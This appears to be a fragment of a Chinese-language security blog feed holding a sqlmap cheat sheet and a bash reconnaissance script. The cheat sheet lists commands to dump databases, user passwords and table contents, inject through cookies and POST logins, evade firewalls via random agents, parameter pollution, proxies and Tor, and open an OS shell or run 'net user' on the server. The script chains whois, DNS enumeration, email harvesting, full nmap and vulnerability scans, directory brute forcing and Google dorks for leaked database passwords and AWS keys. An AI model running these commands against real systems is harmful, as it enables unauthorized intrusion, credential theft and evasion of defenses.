+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u 注入点 检测注入点是否可用</span><br><span class="line">sqlmap -u 注入点 –batch 自动输入</span><br><span class="line">暴库</span><br><span class="line">sqlmap -u 注入点 –dbs //暴库</span><br><span class="line">Web当前使用的数据库</span><br><span class="line">sqlmap -u 注入点 –current-db //爆当前使用的库</span><br><span class="line">Web数据库使用的账户</span><br><span class="line">sqlmap -u 注入点 –current-user //当前使用的账户</span><br><span class="line">列出sqlserver所有用户</span><br><span class="line">sqlmap -u 注入点 –users // 列出所有使用过的账户</span><br><span class="line">数据库账户与密码</span><br><span class="line">sqlmap -u 注入点 –passwords //mysql的登录账户和密码</span><br><span class="line">列出数据库中的表</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 –tables //(-D指定数据库名称)</span><br><span class="line">列出表中字段</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 -T 指定的表名 –columns</span><br><span class="line">爆字段内容</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 -T 指定表名 -C “email,username,userpassword” –dump (将结果导出)</span><br><span class="line">指定导出特定范围字段内容</span><br><span class="line">sqlmap -u注入点-D tourdata -T userb -C “email,username,userpassword”–start 1 –stop 10 –dump (1,10行数)</span><br><span class="line">Cookie注入</span><br><span class="line">sqlmap -u “注入点” –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –table –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –columns -T “user” –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –dump -C “username,password”–columns -T “user” –cookie “id=97” –level 2</span><br><span class="line">可对以上参数进行结合使用</span><br><span class="line">python sqlmap.py -u “注入点” -f –banner –dbs –users</span><br><span class="line"></span><br><span class="line">post登陆注入 mssql</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345”</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http:” –data “tfUName=12345&amp;tfUPass=12345” –dbs ==获取数据库名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –tables -D “数据库名” ==列表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –columns -T “表名” -D “数据库名” ==暴字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –dump –columns -C “字段,字段” -T “表” -D “数据名” ==暴字段内容</span><br><span class="line"></span><br><span class="line">伪静态注入</span><br><span class="line">注入点：http://.html （注意：要加个* 哪里存在注入就加上 * 号）</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –dbs ==获取数据库名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –tables -D “数据名” ==获取数据库当中的表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –columns -D “数据名” -T “表名” ==获取数据库的表中的字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –dump -D “数据名” -T “表名” -C “字段,字段” ==获取数据库的表中的字段内容</span><br><span class="line"></span><br><span class="line">绕过防火墙注入</span><br><span class="line">确认是否开了WAF</span><br><span class="line">Sqlmap -u “注入点” –thread 10 –identify-waf (首选)</span><br><span class="line">sqlmap -u “注入点” –thread 10 –check-waf 备选</span><br><span class="line">使用参数绕过</span><br><span class="line">Sqlmap -u “注入点” –random-agent -v 2 （浏览器绕过）</span><br><span class="line">Sqlmap -u “注入点” –hpp -v 3 (参数污染绕过)</span><br><span class="line">Sqlmap -u “注入点” –delay=3.5 –time-sec=60</span><br><span class="line">Sqlmap -u “注入点” –proxy=211.211.211.211.8080 –proxy-cred=211.:985 代理注入</span><br><span class="line">sqlmap -u “注入点” –ignore-proxy 禁止用代理注入，直接注入</span><br><span class="line">sqlmap -u “注入点” –flush-session 清空会话，重构注入</span><br><span class="line">sqlmap -u “注入点” -hex 或者–no-cast 进行字符码转换</span><br><span class="line">sqlmap -u “注入点” –mobile 对移动端的服务器进行注入</span><br><span class="line">sqlmap -u “注入点” –tor 匿名注入</span><br><span class="line"></span><br><span class="line">直接拿shell或者执行命令（需要权限很大跟物理路径）</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url –os-shell</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url –os-cmd=ipconfig</span><br><span class="line"></span><br><span class="line">请求延时（一般突破防火墙）</span><br><span class="line"></span><br><span class="line">第一种方法：sqlmap.py -u url –delay 2 （注意：2是两秒的意思，也就是说2秒访问一次）</span><br><span class="line">第二种方法： sqlmap.py -u url –safe-freq 3 （注意：3是3次的意思。。）</span><br><span class="line"></span><br><span class="line">可以组合使用 sqlmap.py -u url –delay 2 –safe-freq 3</span><br><span class="line"></span><br><span class="line">测试注入点权限：</span><br><span class="line">sqlmap -u url –privileges</span><br><span class="line"></span><br><span class="line">执行shell命令命令</span><br><span class="line">sqlmap -u url –os-cmd=”net user” //执行netuser命令</span><br><span class="line">sqlmap -u url –os-shell //系统交互的shell</span><br><span class="line">————————————————</span><br></pre></td></tr></table></figure>
+<p><a href="https://hackmd.io/@bttea/sqlmap_common_parameters">https://hackmd.io/@bttea/sqlmap_common_parameters</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">if [ $# -ne 1 ];then</span><br><span class="line">    echo &quot;Usage: $0 &lt;target&gt;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">target=$1</span><br><span class="line">mkdir -p recon-$target</span><br><span class="line">cd recon-$target</span><br><span class="line">echo &quot;[*] 正在初始化偵查目標: $target&quot;</span><br><span class="line"></span><br><span class="line"># 1. Whois / DNS 基本資料搜集</span><br><span class="line">echo &quot;[*] Whois資訊搜集...&quot;</span><br><span class="line">whois $target &gt; whois.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] DNS資訊搜集...&quot;</span><br><span class="line">dig $target any &gt; dig_any.txt</span><br><span class="line">dig $target mx &gt; dig_mx.txt</span><br><span class="line">dig $target txt &gt; dig_txt.txt</span><br><span class="line">host -a $target &gt; host.txt</span><br><span class="line">nslookup $target &gt; nslookup.txt</span><br><span class="line"></span><br><span class="line"># 2. 子域名搜集（Kali內建）</span><br><span class="line">echo &quot;[*] 子域名收集(dnsenum+fierce+dnsrecon)...&quot;</span><br><span class="line">dnsenum $target -o dnsenum.xml</span><br><span class="line">fierce --domain $target &gt; fierce.txt</span><br><span class="line">dnsrecon -d $target -a &gt; dnsrecon.txt</span><br><span class="line"></span><br><span class="line"># 3. theHarvester 整合收集Email/帳號/子域</span><br><span class="line">echo &quot;[*] theHarvester收集Email/帳號...&quot;</span><br><span class="line">theHarvester -d $target -b all -f theharvester.html</span><br><span class="line"></span><br><span class="line"># 4. 技術棧分析 (whatweb+curl頭部)</span><br><span class="line">echo &quot;[*] 技術棧分析...&quot;</span><br><span class="line">whatweb -v $target &gt; whatweb.txt</span><br><span class="line">curl -I http://$target &gt; curl_headers.txt</span><br><span class="line"></span><br><span class="line"># 5. Nmap大範圍掃描</span><br><span class="line">echo &quot;[*] Nmap完整掃描...&quot;</span><br><span class="line">nmap -sS -sV -p- -v -T4 $target -oA nmap_fullscan</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Nmap HTTP相關漏洞掃描...&quot;</span><br><span class="line">timeout 60 nmap --script=http-enum,http-vuln* -p 80,443 $target -oA nmap_http_enum</span><br><span class="line"></span><br><span class="line"># 6. HTTP Method測試</span><br><span class="line">echo &quot;[*] HTTP Method探測...&quot;</span><br><span class="line">curl -X OPTIONS -I http://$target &gt; http_methods.txt</span><br><span class="line"></span><br><span class="line"># 7. 爆破目錄與檔案 (gobuster/dirb/wfuzz)</span><br><span class="line">echo &quot;[*] gobuster目錄爆破...&quot;</span><br><span class="line">gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,jsp,php,html,txt,zip,bak,tar.gz -t 50 &gt; gobuster.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] dirb目錄爆破...&quot;</span><br><span class="line">dirb http://$target /usr/share/wordlists/dirb/common.txt &gt; dirb.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] wfuzz爆破...&quot;</span><br><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://$target/FUZZ &gt; wfuzz.txt</span><br><span class="line"></span><br><span class="line"># 8. Google Hacking提示</span><br><span class="line">echo &quot;[*] Google Hacking建議語法，請手動搜尋:&quot;</span><br><span class="line">echo &quot;----------------------------------------&quot;</span><br><span class="line">echo &quot;site:$target ext:sql | ext:bak | ext:old | ext:backup&quot;</span><br><span class="line">echo &quot;site:$target intitle:\&quot;index of\&quot;&quot;</span><br><span class="line">echo &quot;site:$target inurl:\&quot;admin\&quot; | \&quot;login\&quot;&quot;</span><br><span class="line">echo &quot;site:$target inurl:\&quot;upload\&quot; | \&quot;submit\&quot;&quot;</span><br><span class="line">echo &quot;site:$target ext:xml | ext:json | ext:conf | ext:env | ext:jsp&quot;</span><br><span class="line">echo &quot;site:$target \&quot;Warning\&quot; | \&quot;Fatal error\&quot; | \&quot;unexpected token\&quot;&quot;</span><br><span class="line">echo &quot;site:$target \&quot;phpinfo()\&quot;&quot;</span><br><span class="line">echo &quot;site:$target \&quot;DB_PASSWORD\&quot; | \&quot;AWS_SECRET_ACCESS_KEY\&quot;&quot;</span><br><span class="line">echo &quot;cache:$target&quot;</span><br><span class="line">echo &quot;site:$target filetype:pdf | filetype:docx&quot;</span><br><span class="line">echo &quot;site:$target \&quot;Apache Tomcat\&quot; | \&quot;Jenkins\&quot; | \&quot;Confluence\&quot;&quot;</span><br><span class="line">echo &quot;----------------------------------------&quot;</span><br><span class="line"></span><br><span class="line"># 9. 歷史資料蒐集</span><br><span class="line">echo &quot;[*] 手動挖掘Archive歷史頁面，嘗試存取Wayback Machine...&quot;</span><br><span class="line">curl &quot;http://web.archive.org/cdx/search/cdx?url=$target/*&amp;output=text&amp;fl=original&quot; &gt; archive_urls.txt</span><br><span class="line"></span><br><span class="line"># 10. SSL掃描</span><br><span class="line">echo &quot;[*] SSL弱點掃描...&quot;</span><br><span class="line">sslscan $target &gt; sslscan.txt</span><br><span class="line"></span><br><span class="line"># 11. 旁站偵測</span><br><span class="line">echo &quot;[*] 旁站偵測(http-vhosts)...&quot;</span><br><span class="line">nmap --script=http-vhosts -p 80 $target -oA vhost_enum</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 偵查完成，所有資料已經收集！&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://otx.alienvault.com/indicator/ip/210.69.167.102">https://otx.alienvault.com/indicator/ip/210.69.167.102</a></p>
 ]]></content>
       <categories>
         <category>資安</category>
